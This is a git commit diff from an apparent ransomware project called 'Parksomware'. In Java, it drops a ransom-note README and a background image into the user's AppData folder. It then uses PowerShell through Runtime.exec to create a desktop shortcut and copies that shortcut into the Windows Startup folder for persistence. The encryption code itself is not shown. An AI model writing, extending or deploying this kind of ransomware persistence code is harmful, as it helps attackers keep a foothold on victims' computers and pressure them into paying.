8a78edfeec14e15eabab497f454543d5faf1207c
ParkMini <parkteammini@gmail.com>
2023-12-14 18:14:13 +0900

    Parksomware 디렉토리에 파일을 저장하고 바탕화면에 바로가기 파일 생성 및 시작 프로그램 등록

--- src/main/java/kr/pah/CreateReadme.java
+++ src/main/java/kr/pah/CreateReadme.java
@@ -5,20 +5,28 @@ import java.io.*;
 import java.nio.file.*;
 
 public class CreateReadme {
+
+    private static final String PARKSOMWARE_DIR = System.getenv("APPDATA") + "\\Parksomware";
+
     public static void main() {
         try {
-            Path desktopPath = Paths.get(System.getenv("USERPROFILE"), "Desktop");
-            Path readmePath = extractFileToDesktop(desktopPath, "/README.html");
-            Path backgroundPath = extractFileToDesktop(desktopPath, "/background.png");
-            openInBrowser(readmePath);
-            addToStartup(readmePath);
+            Path parksomwarePath = Paths.get(PARKSOMWARE_DIR);
+            if (!Files.exists(parksomwarePath)) {
+                Files.createDirectories(parksomwarePath);
+            }
+
+            Path readmePath = extractFileToAppData("/README.html");
+            Path backgroundPath = extractFileToAppData("/background.png");
+
+            Path desktopShortcut = addToDesktopShortcut(readmePath);
+            addToStartup(desktopShortcut);
         } catch (IOException e) {
             e.printStackTrace();
         }
     }
 
-    private static Path extractFileToDesktop(Path desktopPath, String resourceFileName) throws IOException {
-        Path filePath = desktopPath.resolve(resourceFileName.substring(1)); // Remove the leading "/"
+    private static Path extractFileToAppData(String resourceFileName) throws IOException {
+        Path filePath = Paths.get(PARKSOMWARE_DIR, resourceFileName.substring(1)); // Remove the leading "/"
         try (InputStream is = CreateReadme.class.getResourceAsStream(resourceFileName)) {
             if (is == null) {
                 throw new FileNotFoundException(resourceFileName + " not found in Jar file.");
@@ -28,21 +36,21 @@ public class CreateReadme {
         return filePath;
     }
 
-    private static void openInBrowser(Path filePath) throws IOException {
-        if (Desktop.isDesktopSupported()) {
-            Desktop.getDesktop().browse(filePath.toUri());
-        } else {
-            throw new UnsupportedOperationException("Desktop is not supported.");
-        }
-    }
-
-    private static void addToStartup(Path filePath) throws IOException {
-        String startupFolderPath = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-        Path shortcutPath = Paths.get(startupFolderPath, "OpenReadme.lnk");
+    private static Path addToDesktopShortcut(Path filePath) throws IOException {
+        Path desktopPath = Paths.get(System.getenv("USERPROFILE"), "Desktop");
+        Path shortcutPath = desktopPath.resolve(filePath.getFileName().toString() + ".lnk");
 
         String script = "powershell \"$s = (New-Object -COM WScript.Shell).CreateShortcut('" + shortcutPath.toString() + "'); "
                 + "$s.TargetPath = '" + filePath.toString() + "'; $s.Save()\"";
 
         Runtime.getRuntime().exec(script);
+        return shortcutPath;
+    }
+
+    private static void addToStartup(Path shortcutPath) throws IOException {
+        String startupFolderPath = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+        Path startupShortcutPath = Paths.get(startupFolderPath, shortcutPath.getFileName().toString());
+
+        Files.copy(shortcutPath, startupShortcutPath, StandardCopyOption.REPLACE_EXISTING);
     }
 }
